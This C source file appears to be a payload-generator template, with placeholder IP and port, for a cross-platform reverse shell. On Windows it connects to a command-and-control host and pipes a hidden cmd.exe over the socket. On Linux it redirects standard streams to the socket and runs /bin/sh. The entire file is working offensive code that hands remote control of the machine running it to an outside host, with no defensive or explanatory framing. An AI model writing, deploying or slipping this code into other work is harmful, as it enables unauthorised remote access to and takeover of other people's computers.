#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Platform Detection
#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include <ws2tcpip.h>
    // Link against ws2_32.lib for MSVC (MinGW uses -lws2_32 flag)
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
#endif

int main(void) {
    char *ip = "{{ ip }}";
    int port = {{ port }};

#ifdef _WIN32
    // ----------------------------
    // Windows Reverse Shell Logic
    // ----------------------------
    WSADATA wsaData;
    SOCKET s1;
    struct sockaddr_in hax;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // 1. Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // 2. Create Socket
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s1 == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // 3. Setup Connection
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);

    // 4. Connect to C2
    if (connect(s1, (struct sockaddr *)&hax, sizeof(hax)) != 0) {
        closesocket(s1);
        WSACleanup();
        return 1;
    }

    // 5. Prepare Process Structures
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    // Pipe socket to stdin/stdout/stderr
    si.hStdInput = (HANDLE)s1;
    si.hStdOutput = (HANDLE)s1;
    si.hStdError = (HANDLE)s1;
    si.wShowWindow = SW_HIDE; // Hide the cmd window

    // 6. Spawn cmd.exe
    TCHAR cmd[] = TEXT("cmd.exe");
    if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s1);
    WSACleanup();

#else
    // ----------------------------
    // Linux Reverse Shell Logic
    // ----------------------------
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    
    if (sockt < 0) return 1;

    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) != 0) {
        return 1;
    }

    // Redirect FDs to socket
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    // Execute shell
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

#endif

    return 0;
}
